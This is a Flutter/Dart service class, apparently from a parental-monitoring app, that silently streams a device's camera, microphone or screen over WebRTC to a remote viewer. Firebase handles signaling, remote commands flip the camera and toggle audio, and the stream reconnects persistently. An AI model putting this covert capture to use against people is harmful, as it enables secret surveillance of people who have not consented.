import 'dart:async';

import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';

class SilentWebRTCService {
  static SilentWebRTCService? _instance;
  static SilentWebRTCService get instance => _instance ??= SilentWebRTCService._();
  SilentWebRTCService._();

  RTCPeerConnection? _pc;
  MediaStream? _localStream;
  bool _active = false;
  bool _connecting = false;
  String? _activeUid;
  String? _activeMode;
  StreamSubscription? _offerSub, _candidateSub, _statusSub, _commandSub;
  bool _answerSet = false;
  int _reconnectAttempts = 0;
  static const int _maxReconnect = 7;
  Timer? _reconnectTimer;
  Timer? _watchdogTimer;
  Timer? _heartbeatTimer;
  DateTime? _lastIceActivity;

  static const _ice = {
    'iceServers': [
      {'urls': 'stun:stun.l.google.com:19302'},
      {'urls': 'stun:stun1.l.google.com:19302'},
      {'urls': 'stun:stun2.l.google.com:19302'},
    ],
    'sdpSemantics': 'unified-plan',
    'iceCandidatePoolSize': 10,
  };

  bool get isActive => _active;

  Future<void> startSilentCamera(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'camera') return;
    await stopSilent();
    _activeMode = 'camera';
    await _startStream(childUid);
  }

  Future<void> startSilentScreen(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'screen') return;
    await stopSilent();
    _activeMode = 'screen';
    await _startStream(childUid);
  }

  Future<void> _startStream(String childUid) async {
    _active = true;
    _activeUid = childUid;
    _answerSet = false;
    _reconnectAttempts = 0;
    await _connect(childUid);
  }

  Future<void> _connect(String childUid) async {
    if (_connecting) return;
    _connecting = true;
    try {
      // Tear down any previous connection
      await _cleanupPcOnly();
      _pc = await createPeerConnection(_ice);
      _lastIceActivity = DateTime.now();

      _pc!.onIceConnectionState = (state) {
        debugPrint('[SilentWebRTC] ICE: $state');
        _lastIceActivity = DateTime.now();
        if (state == RTCIceConnectionState.RTCIceConnectionStateFailed ||
            state == RTCIceConnectionState.RTCIceConnectionStateDisconnected) {
          _scheduleReconnect(childUid);
        } else if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
                   state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
          _reconnectAttempts = 0;
        }
      };

      _pc!.onConnectionState = (state) {
        debugPrint('[SilentWebRTC] Connection: $state');
        if (state == RTCPeerConnectionState.RTCPeerConnectionStateFailed ||
            state == RTCPeerConnectionState.RTCPeerConnectionStateClosed) {
          _scheduleReconnect(childUid);
        }
      };

      // Acquire media
      _localStream = await _acquireMedia();
      if (_localStream == null || !_active) {
        _connecting = false;
        return;
      }

      final tracks = _localStream!.getTracks();
      if (tracks.isEmpty) {
        debugPrint('[SilentWebRTC] No tracks — aborting');
        _active = false;
        _connecting = false;
        return;
      }
      for (final t in tracks) {
        await _pc!.addTrack(t, _localStream!);
      }

      final db = FirebaseDatabase.instance.ref();

      _pc!.onIceCandidate = (c) {
        if (c.candidate == null || !_active) return;
        db.child('calls/$childUid/childCandidates').push().set({
          'candidate': c.candidate,
          'sdpMid': c.sdpMid,
          'sdpMLineIndex': c.sdpMLineIndex,
        });
      };

      await db.child('calls/$childUid/childCandidates').remove();
      await db.child('calls/$childUid/answer').remove();

      _offerSub = db.child('calls/$childUid/offer').onValue.listen((e) async {
        if (e.snapshot.value == null || _pc == null || _answerSet || !_active) return;
        try {
          final d = Map<String, dynamic>.from(e.snapshot.value as Map);
          await _pc!.setRemoteDescription(RTCSessionDescription(d['sdp'], d['type']));
          final ans = await _pc!.createAnswer({
            'offerToReceiveVideo': false,
            'offerToReceiveAudio': false,
          });
          await _pc!.setLocalDescription(ans);
          await db.child('calls/$childUid/answer').set({'sdp': ans.sdp, 'type': ans.type});
          _answerSet = true;
          debugPrint('[SilentWebRTC] Answer sent');
        } catch (ex) {
          debugPrint('[SilentWebRTC] Answer error: $ex');
        }
      });

      _candidateSub = db.child('calls/$childUid/parentCandidates').onChildAdded.listen((e) async {
        if (e.snapshot.value == null || _pc == null || !_active) return;
        try {
          final c = Map<String, dynamic>.from(e.snapshot.value as Map);
          await _pc!.addCandidate(
              RTCIceCandidate(c['candidate'], c['sdpMid'], c['sdpMLineIndex']));
        } catch (_) {}
      });

      _commandSub = db.child('calls/$childUid/command').onValue.listen((e) async {
        if (!_active) return;
        final cmd = e.snapshot.value as String?;
        if (cmd == 'flip') {
          final t = _localStream?.getVideoTracks() ?? [];
          if (t.isNotEmpty) {
            try { await Helper.switchCamera(t.first); } catch (_) {}
          }
        } else if (cmd == 'mute') {
          _localStream?.getAudioTracks().forEach((t) => t.enabled = false);
        } else if (cmd == 'unmute') {
          _localStream?.getAudioTracks().forEach((t) => t.enabled = true);
        }
      });

      _statusSub = db.child('calls/$childUid/status').onValue.listen((e) async {
        final status = e.snapshot.value as String?;
        if (status == 'ended' || status == null) {
          await stopSilent();
        }
      });

      _startWatchdog(childUid);
      _startHeartbeat(childUid, db);
      debugPrint('[SilentWebRTC] Streaming (mode: $_activeMode)');
    } catch (e) {
      debugPrint('[SilentWebRTC] Connect error: $e');
      _scheduleReconnect(childUid);
    } finally {
      _connecting = false;
    }
  }

  Future<MediaStream?> _acquireMedia() async {
    try {
      if (_activeMode == 'screen') {
        return await navigator.mediaDevices.getDisplayMedia({
          'video': {'frameRate': 15, 'width': 720, 'height': 1280},
          'audio': false,
        });
      }
    } catch (e) {
      debugPrint('[SilentWebRTC] Screen capture failed, falling back: $e');
    }
    // Camera fallback (also used for camera mode)
    try {
      return await navigator.mediaDevices.getUserMedia({
        'video': {
          'facingMode': 'environment',
          'width': {'ideal': 640},
          'height': {'ideal': 480},
          'frameRate': {'ideal': 15, 'max': 30},
        },
        'audio': true,
      });
    } catch (e) {
      debugPrint('[SilentWebRTC] Camera acquisition failed: $e');
      return null;
    }
  }

  void _scheduleReconnect(String childUid) {
    if (!_active || _reconnectAttempts >= _maxReconnect) return;
    _reconnectTimer?.cancel();
    _reconnectAttempts++;
    // Exponential backoff: 2^n seconds (1, 2, 4, 8, 16, 32, 64)
    final delay = Duration(seconds: 1 << (_reconnectAttempts - 1));
    debugPrint('[SilentWebRTC] Reconnect #$_reconnectAttempts in ${delay.inSeconds}s');
    _reconnectTimer = Timer(delay, () async {
      if (!_active) return;
      await _connect(childUid);
    });
  }

  void _startWatchdog(String childUid) {
    _watchdogTimer?.cancel();
    _watchdogTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
      if (!_active) { _watchdogTimer?.cancel(); return; }
      if (_lastIceActivity != null &&
          DateTime.now().difference(_lastIceActivity!) > const Duration(seconds: 60)) {
        debugPrint('[SilentWebRTC] Watchdog: stale ICE, reconnecting');
        if (_activeUid != null) _scheduleReconnect(_activeUid!);
      }
    });
  }

  void _startHeartbeat(String childUid, DatabaseReference db) {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 25), (_) async {
      if (!_active) { _heartbeatTimer?.cancel(); return; }
      try {
        await db.child('calls/$childUid/childPing').set(
            DateTime.now().millisecondsSinceEpoch);
      } catch (_) {}
    });
  }

  Future<void> _cleanupPcOnly() async {
    _offerSub?.cancel(); _candidateSub?.cancel();
    _statusSub?.cancel(); _commandSub?.cancel();
    _offerSub = null; _candidateSub = null;
    _statusSub = null; _commandSub = null;
    _heartbeatTimer?.cancel(); _heartbeatTimer = null;
    _answerSet = false;
    try {
      _localStream?.getTracks().forEach((t) => t.stop());
      await _localStream?.dispose();
    } catch (_) {}
    _localStream = null;
    try { await _pc?.close(); } catch (_) {}
    _pc = null;
  }

  Future<void> stopSilent() async {
    _active = false;
    _activeUid = null;
    _activeMode = null;
    _reconnectAttempts = 0;
    _reconnectTimer?.cancel(); _reconnectTimer = null;
    _watchdogTimer?.cancel(); _watchdogTimer = null;
    await _cleanupPcOnly();
    debugPrint('[SilentWebRTC] Stopped');
  }
}
